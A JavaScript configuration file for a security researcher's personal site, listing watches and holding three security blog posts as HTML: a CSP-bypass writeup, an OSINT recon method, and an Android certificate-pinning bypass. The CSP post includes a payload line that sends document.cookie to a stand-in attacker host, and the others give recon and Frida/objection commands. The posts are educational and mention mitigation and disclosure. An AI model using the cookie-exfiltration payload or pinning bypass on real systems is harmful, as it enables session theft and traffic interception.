// ═══════════════════════════════════════════════════════════════
//  SITE CONFIG — Edit everything here.
//  To add a watch: copy one object in COLLECTION or WANTED.
//  To add an article: copy one object in ARTICLES. body supports HTML.
// ═══════════════════════════════════════════════════════════════

window.SITE = {

  handle:  'honigkuchenpferd64',
  tagline: 'Security researcher. Mechanical watches. Geometric obsessions.',
  github:  'https://github.com/honigkuchenpferd64',

  // ── WATCHES IN HAND ──────────────────────────────────────────
  // img: URL or relative path e.g. "img/nautilus.jpg". Leave "" for placeholder.
  collection: [
    {
      ref:  'T137.407.11.041.00',
      name: 'Tissot PRX 40mm',
      img:  'https://www.tissotwatches.com/dw/image/v2/BKKD_PRD/on/demandware.static/-/Sites-Tissot-Catalogue/default/dw95c4331d/product-pictures/63f42767-a9f5-4cdd-b952-8ea7b82b7e0c_T137-407-11-041-00_shadow.png?sm=fit&sw=800&sh=800,gravity=center'
    },
    {
      ref:  'TW2V43600',
      name: 'Q Timex 1979 Reissue',
      img:  'https://timex.com/cdn/shop/articles/Q_Timex_Reissue_Degrade_beauty_2_RGB_Final_1_1.jpg?v=1700511673'
    },
    {
      ref:  'NY4058-01E',
      name: 'Citizen Automatic "Classics"',
      img:  'https://assets.chrimg.com/image/christ/89207449/89207449/product_lg/89207449.jpg'
    },
    {
      ref:  'TW2Y66700',
      name: 'Timex Automatic 1983 E Line',
      img:  'https://timex.eu/cdn/shop/files/12916_TX_TC_25_FGI_desktop_TW2Y66700_2.jpg?v=1769081199&width=1980'
    },
    {
      ref:  'MTP-1302PD-3AV',
      name: 'Casio MTP 1302"',
      img:  'https://www.casio.com/content/dam/casio/product-info/locales/de/de/timepiece/product/watch/M/MT/MTP/mtp-1302pd-3av/assets/MTP-1302PD-3AV.png.transform/main-visual-pc/image.png'
    }
  ],

  // ── WANTED LIST ───────────────────────────────────────────────
  wanted: [
    {
      ref:  'SRPD37J1',
      name: 'Seiko Presage',
      img:  'https://clockchasers.com/cdn/shop/files/seiko-presage-automatik-herrenuhr-srpd37j1-151250_458x.jpg?v=1742045717'
    },
    {
      ref:  'TW2Y60600',
      name: 'Waterbury Heritage Automatic GMT',
      img:  'https://timex.eu/cdn/shop/files/TW2Y60600_c4b8e9b2-afc2-4577-8bbb-00ddc5d0952a.png?v=1776198234&width=768'
    }
  ],

  // ── ARTICLES ─────────────────────────────────────────────────
  // id:      unique slug (used in URL: article.html?id=your-slug)
  // date:    ISO format YYYY-MM-DD
  // tag:     short category label
  // title:   article headline
  // excerpt: one-sentence teaser shown in the list view
  // img:     banner image URL or "" for none
  // body:    full article as HTML — use <p>, <h3>, <code>, <pre><code>
  articles: [
    {
      id:      'xss-bypass-csp',
      date:    '2025-03-14',
      tag:     'Web Security',
      title:   'Bypassing CSP With Polyglot Payloads',
      excerpt: 'A deep dive into Content Security Policy weaknesses and how carefully crafted polyglot files slip past even strict directives.',
      img:     '',
      body:    `
        <p>Content Security Policy is one of the most powerful browser-side mitigations for XSS — but misconfigured
        or overly permissive policies create subtle gaps that attackers exploit with creative payloads.</p>

        <h3>What is a Polyglot?</h3>
        <p>A polyglot file is simultaneously valid in two or more formats. A JPEG/JS polyglot, for example, is a real
        image that browsers will also execute as JavaScript under the right conditions.</p>

        <h3>The Attack Path</h3>
        <p>If a target site allows <code>script-src 'self'</code> and also hosts user uploads, you can upload a
        polyglot JPEG that contains executable JS in its EXIF metadata or trailing bytes:</p>
        <pre><code>// Polyglot payload embedded in JPEG comment
// ÿþ /* valid JS starts here */
fetch('https://attacker.io/?c=' + document.cookie)</code></pre>
        <p>Combine this with a dangling markup injection to load your image as a script and the CSP offers no protection.</p>

        <h3>Mitigation</h3>
        <p>Strip all metadata from user uploads server-side. Serve uploads from a sandboxed subdomain with no cookies.
        Use <code>require-trusted-types-for 'script'</code> in your CSP and audit every <code>script-src</code> allowlist entry.</p>
      `
    },
    {
      id:      'osint-recon-methodology',
      date:    '2025-01-28',
      tag:     'OSINT',
      title:   'OSINT Recon on a Target Org: A Methodical Approach',
      excerpt: 'How I mapped the full external attack surface of a bug bounty target using only public data in under 48 hours.',
      img:     '',
      body:    `
        <p>Good reconnaissance is the difference between a shallow engagement and a meaningful one. This writeup walks
        through my recon methodology for a bug bounty target — no active scanning, purely passive OSINT.</p>

        <h3>Phase 1: ASN Enumeration</h3>
        <p>Starting from the company name, I used <code>bgp.he.net</code> to find their ASN and pulled all associated
        CIDR ranges. This gives you the full IP landscape before touching a single host.</p>

        <h3>Phase 2: Subdomain Discovery</h3>
        <p>Certificate transparency logs via <code>crt.sh</code> yielded over 400 subdomains. Cross-referencing with
        DNS brute-forcing through SecurityTrails brought that to roughly 600 unique hosts.</p>

        <h3>Phase 3: Tech Fingerprinting</h3>
        <p>Shodan and Censys painted a picture of exposed admin panels, outdated Apache versions, and one glorious
        Jenkins instance with anonymous access still enabled.</p>

        <pre><code># Quick Shodan sweep for the ASN
shodan search "org:TargetCorp" --fields ip_str,port,hostnames | sort -u</code></pre>

        <p>From there, the path to a valid report was a matter of patience and methodical enumeration — not clever exploits.</p>
      `
    },
    {
      id:      'android-certificate-pinning',
      date:    '2024-11-05',
      tag:     'Reverse Engineering',
      title:   'Decompiling Android APKs: Certificate Pinning Bypass',
      excerpt: 'Walking through APKTool, Jadx and Frida to intercept HTTPS traffic from an app that thought it was safe.',
      img:     '',
      body:    `
        <p>Certificate pinning is meant to prevent MITM attacks by hardcoding trusted certificates into the app.
        Here is how I bypassed it on a real bug bounty target using a Frida hook, no APK recompilation needed.</p>

        <h3>Tools</h3>
        <p><code>apktool</code>, <code>jadx-gui</code>, <code>Frida</code>, <code>objection</code>, <code>Burp Suite</code>.</p>

        <h3>Step 1: Decompile and Locate Pinning Logic</h3>
        <pre><code>apktool d target.apk -o ./target_out
# Open in jadx and search:
# X509TrustManager / checkServerTrusted / CertificatePinner</code></pre>

        <h3>Step 2: Disable Pinning at Runtime With Objection</h3>
        <pre><code>frida-ps -U | grep target
objection -g com.target.app explore
# Inside the objection shell:
android sslpinning disable</code></pre>

        <p>With pinning disabled, all HTTPS traffic routes cleanly through Burp Suite. From there it is standard
        web testing — parameter tampering, auth header inspection, IDOR hunting.</p>

        <h3>Responsible Disclosure</h3>
        <p>Report filed within scope. The vendor patched within 30 days. Always disclose responsibly.</p>
      `
    }
  ]

}; // end SITE
